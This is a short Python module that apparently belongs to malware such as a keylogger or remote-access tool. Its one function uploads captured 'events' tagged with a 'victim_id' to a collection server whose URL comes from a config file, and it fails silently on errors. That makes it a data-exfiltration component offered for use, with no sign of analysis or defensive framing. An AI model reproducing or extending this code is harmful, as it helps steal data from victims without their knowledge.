import requests
import json
from config import SERVER_URL

def send_events(victim_id, events):
    payload = {
        "victim_id": victim_id,
        "events": events
    }

    try:
        r = requests.post(SERVER_URL, json=payload, timeout=3)
        return r.status_code == 200
    except Exception:
        return False
